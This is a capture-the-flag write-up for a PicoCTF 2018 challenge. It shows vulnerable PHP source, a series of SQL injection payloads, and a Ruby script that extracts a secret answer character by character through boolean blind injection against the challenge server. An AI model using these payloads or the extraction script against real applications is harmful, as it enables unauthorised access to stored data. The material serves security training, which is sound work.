## Challenge
In this challenge, we were given a link to a basic website with a simple form.

"Try to see if you can answer its question"

## Discovery

A comment in the HTML of the form said:

```html
<!-- source code is in answer2.phps -->
```

I navigated to `/answer2.phps` and found the following:

```php
<?php
  include "config.php";
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  $answer = $_POST["answer"];
  $debug = $_POST["debug"];
  $query = "SELECT * FROM answers WHERE answer='$answer'";
  echo "<pre>";
  echo "SQL query: ", htmlspecialchars($query), "\n";
  echo "</pre>";
?>
<?php
  $con = new SQLite3($database_file);
  $result = $con->query($query);

  $row = $result->fetchArray();
  if($answer == $CANARY)  {
    echo "<h1>Perfect!</h1>";
    echo "<p>Your flag is: $FLAG</p>";
  }
  elseif ($row) {
    echo "<h1>You are so close.</h1>";
  } else {
    echo "<h1>Wrong.</h1>";
  }
?>
```

I took a few things away from this code. One, I know the exact SQL query that is being run when I submit the form.

```php
$query = "SELECT * FROM answers WHERE answer='$answer'";
```

Two, it seems that there are three potential outcomes of submitting the form: (1) you guess the right answer and
see the flag ("Perfect!"), (2) you get data back from the sql query ("You are so close.") and (3) you don't get 
data back from the SQL query ("Wrong").

I played with SQL injection. Quickly, I realized that I could know the column names on the answer table by plugging my
guesses into the query. For example, this SQL query returned a long error with a message about id not being a column name.

```sql
' UNION SELECT id FROM ANSWERS LIMIT 1;--
```

This query, however, did not return an error:

```sql
' UNION SELECT answer FROM ANSWERS LIMIT 1;--
```

I also tried some funky stuff to see if I could make more tables.

```sql
‘ BEGIN TRANSACTION; CREATE TEMPORARY TABLE backup(answer, id); INSERT INTO backup SELECT answer FROM ANSWERS; COMMIT;—
```

Then:

```sql
' UNION SELECT id FROM BACKUP LIMIT 1;--
```

None of that worked. Next I tried checking for wildcards

```sql
' OR answer LIKE "%" LIMIT 1;--
```

I didn't get an error, so I went further. Lets see if there are any spaces in the answer

```sql
' OR answer LIKE "% %" LIMIT 1;--
```
This returned an error, meaning that I could leak the answer one character at a time by monitoring whether I got an error
or not.


## Solution

I wrote a short ruby script to loop through the alphabet and try to find each character of the answer. If the response
was "You are so close", I added the character to the final answer string and looped throug the alphabet again to append
the next letter.

```ruby
require 'HTTParty'

index = 0
alphabet = ('!'..'z').to_a
final = ''
res = nil

until false
  current = alphabet[index]
  current = alphabet[index] == '%' ? "'#{ alphabet[index] }'" : alphabet[index]

  query = "' OR answer LIKE '#{ final }#{ current }%' LIMIT 1;--"

  options = {
    :body => {
      :answer => query,
      :debug => 0
    }
  }

  res = HTTParty.post('http://2018shell1.picoctf.com:32635/answer2.php', options)

  if res&.include?('You are so close')
    final += current
    index = 0
    puts "ITS A MATCH! #{ current }"
  else
    index += 1
  end
end
```

I learned a few things in this process. One, because % is a wildcard, but also a potential character in the answer string,
I needed to add quotes around it in the query.

```ruby
current = alphabet[index] == '%' ? "'#{ alphabet[index] }'" : alphabet[index]
```

Two, "LIKE" is case insensitive. My final string was `41ANDSIXSIXTHS`. However, when I tried to enter this in the form,
I got "You are so close". It took much table flipping and frustration to figure out that the answer was case sensitive.
Manual guessing got the answer - `41AndSixSixths`


___

PicoCTF 2018 - October 2018
